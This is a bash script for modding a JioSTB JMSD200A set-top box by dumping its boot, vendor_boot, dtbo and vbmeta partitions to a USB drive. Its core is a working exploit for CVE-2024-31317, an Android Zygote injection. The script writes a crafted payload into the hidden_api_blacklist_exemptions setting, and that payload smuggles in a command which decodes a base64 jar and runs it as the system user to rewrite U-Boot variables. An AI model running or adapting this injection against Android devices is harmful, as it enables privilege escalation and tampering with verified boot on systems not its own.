#!/bin/bash
# ============================================================================
# JioSTB JMSD200A — Step 1: Dump Stock Partitions via U-Boot Direct-to-USB
# ============================================================================
# This script configures U-Boot pre-boot environment variables to dump raw
# eMMC partitions directly to a FAT32 USB drive, bypassing Android SELinux.
#
# Dumped Partitions:
#   - boot_b.img       (64 MB, Active Android Kernel & Ramdisk)
#   - boot_a.img       (64 MB, Factory Untouched Slot A)
#   - vendor_boot_b.img(24 MB, Vendor Boot)
#   - dtbo_b.img       (2 MB, Device Tree Blob Overlay)
#   - vbmeta_b.img     (2 MB, Android Verified Boot Metadata)
# ============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BACKUP_DIR="$SCRIPT_DIR/stock_backups"
TOOLS_DIR="$SCRIPT_DIR/tools"
JAR_FILE="$TOOLS_DIR/backup_env.jar"
STB_IP=""
FORCE_ASB=false
SKIP_REBOOT=false

# ANSI colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "  ${GREEN}✓${NC} $*"; }
info() { echo -e "  ${CYAN}ℹ${NC} $*"; }
warn() { echo -e "  ${YELLOW}⚠${NC} $*"; }
err()  { echo -e "  ${RED}✗${NC} $*" >&2; exit 1; }

usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  --stb-ip IP       STB IP address (e.g. 192.168.29.184)"
    echo "  --skip-reboot     Skip initial pre-injection reboot if just booted"
    echo "  --force-asb       Override Android Security Bulletin date check"
    echo "  -h, --help        Show this help message"
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --stb-ip) STB_IP="$2"; shift 2 ;;
        --skip-reboot) SKIP_REBOOT=true; shift ;;
        --force-asb) FORCE_ASB=true; shift ;;
        -h|--help) usage ;;
        *) warn "Unknown argument: $1"; shift ;;
    esac
done

echo -e "${CYAN}======================================================${NC}"
echo -e "${CYAN}  JMSD200A Stage 1: Hardware-Level Partition Dumper  ${NC}"
echo -e "${CYAN}======================================================${NC}"

# 1. Check tools & jar
mkdir -p "$BACKUP_DIR"
if [ ! -f "$JAR_FILE" ]; then
    info "Compiling backup_env.jar from src/SetBackupEnv.java..."
    mkdir -p /tmp/build_backup
    javac --release 8 -d /tmp/build_backup "$SCRIPT_DIR/src/SetBackupEnv.java"
    java -cp "$TOOLS_DIR/r8.jar" com.android.tools.r8.D8 --output "$JAR_FILE" /tmp/build_backup/*.class
    rm -rf /tmp/build_backup
fi
[ -f "$JAR_FILE" ] || err "Failed to find or build $JAR_FILE"

# 2. ADB Connectivity
if [ -n "$STB_IP" ]; then
    info "Connecting to STB at $STB_IP:5555..."
    adb connect "$STB_IP:5555" || true
fi

DEVICE_COUNT=$(adb devices | grep -v "List" | grep "device$" | wc -l)
if [ "$DEVICE_COUNT" -eq 0 ]; then
    err "No ADB devices detected. Run stage1.sh first to enable ADB."
fi

TARGET_SERIAL=$(adb devices | grep -v "List" | grep "device$" | head -n 1 | awk '{print $1}')
log "Using ADB target: $TARGET_SERIAL"
ADB="adb -s $TARGET_SERIAL"

# 3. Check USB drive on STB
info "Checking for mounted FAT32 USB drive on STB..."
USB_MOUNT=$($ADB shell "ls -d /storage/????-???? 2>/dev/null" | tr -d '\r' | head -n 1 || true)
if [ -z "$USB_MOUNT" ]; then
    echo ""
    warn "FAT32 USB drive not detected in /storage/."
    echo -e "   Please insert a ${YELLOW}FAT32-formatted USB flash drive${NC} into the STB secondary USB port."
    read -rp "   Press [Enter] once the USB drive is plugged in: "
    sleep 3
    USB_MOUNT=$($ADB shell "ls -d /storage/????-???? 2>/dev/null" | tr -d '\r' | head -n 1 || true)
fi

if [ -n "$USB_MOUNT" ]; then
    log "USB drive detected at: $USB_MOUNT"
else
    warn "Could not verify USB mount from Android OS. Proceeding if USB is inserted for U-Boot."
fi

# 4. Check Zygote / ASB status
CURRENT_EXEMPTIONS=$($ADB shell "settings get global hidden_api_blacklist_exemptions" | tr -d '\r')
if [ "$CURRENT_EXEMPTIONS" != "null" ] && [ -n "$CURRENT_EXEMPTIONS" ]; then
    warn "Cleaning up existing exemptions: $CURRENT_EXEMPTIONS"
    $ADB shell "settings delete global hidden_api_blacklist_exemptions"
fi

if [ "$SKIP_REBOOT" = false ]; then
    info "Rebooting STB to ensure a clean Zygote session..."
    $ADB reboot
    info "Waiting for device to reconnect..."
    $ADB wait-for-device
    while [ "$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" != "1" ]; do
        sleep 1
    done
    log "Device boot completed."
fi

# 5. Inject U-Boot backup_cmd via CVE-2024-31317
info "Preparing U-Boot backup injection payload..."
JARB64=$(base64 -w0 "$JAR_FILE")
CMD="echo $JARB64 | base64 -d > /cache/be.jar && CLASSPATH=/cache/be.jar:/vendor/framework/droidlogic.jar /system/bin/app_process / SetBackupEnv"
PAYLOAD=$(printf 'LClass1;->method1(\n14\n--runtime-args\n--setuid=1000\n--setgid=1000\n--setgroups=1000\n--runtime-flags=43267\n--target-sdk-version=29\n--nice-name=bootenv31317\n--invoke-with\n%s ;\n--app-data-dir=/data/user/0/com.android.tv.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\n--package-name=com.android.tv.settings\nandroid.app.ActivityThread' "$CMD")

info "Triggering CVE-2024-31317 Zygote injection..."
$ADB shell "settings put global hidden_api_blacklist_exemptions '$PAYLOAD'"
$ADB shell "am force-stop com.android.tv.settings"
sleep 1
$ADB shell "am start -n com.android.tv.settings/.MainSettings" >/dev/null 2>&1
sleep 3
$ADB shell "settings delete global hidden_api_blacklist_exemptions"
log "Injection executed. U-Boot backup_cmd configured."

# 6. Reboot to execute U-Boot backup
echo ""
info "Rebooting STB. U-Boot will now dump partitions directly to the USB drive..."
$ADB reboot
sleep 5

info "Waiting for device to complete hardware dump and boot into Android..."
$ADB wait-for-device
while [ "$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" != "1" ]; do
    sleep 2
done
log "STB successfully rebooted."

# 7. Pull dumped partition images to PC
info "Locating dumped images on USB drive..."
USB_MOUNT=$($ADB shell "ls -d /storage/????-???? 2>/dev/null" | tr -d '\r' | head -n 1 || true)
[ -n "$USB_MOUNT" ] || err "Could not detect USB mount after reboot."

PARTITIONS=("boot_b.img" "boot_a.img" "vendor_boot_b.img" "dtbo_b.img" "vbmeta_b.img")
for img in "${PARTITIONS[@]}"; do
    FILE_SIZE=$($ADB shell "stat -c %s $USB_MOUNT/$img 2>/dev/null" | tr -d '\r' || echo "0")
    if [ "$FILE_SIZE" -gt 0 ]; then
        log "Found $img on USB ($FILE_SIZE bytes). Pulling to $BACKUP_DIR/$img..."
        $ADB pull "$USB_MOUNT/$img" "$BACKUP_DIR/$img"
    else
        warn "Could not find $img on USB drive!"
    fi
done

# 8. Copy fallback stock image to USB
$ADB shell "cp $USB_MOUNT/boot_b.img $USB_MOUNT/stock_boot_b.img 2>/dev/null" || true

# 9. Verify Checksums and Magic Headers
info "Verifying dumped images on host..."
cd "$BACKUP_DIR"
sha256sum *.img > checksums.txt
cat checksums.txt

echo ""
echo -e "${GREEN}======================================================${NC}"
echo -e "${GREEN}  ✓ Partition Dump Complete & Verified!             ${NC}"
echo -e "${GREEN}  Backups saved to: $BACKUP_DIR                     ${NC}"
echo -e "${GREEN}======================================================${NC}"
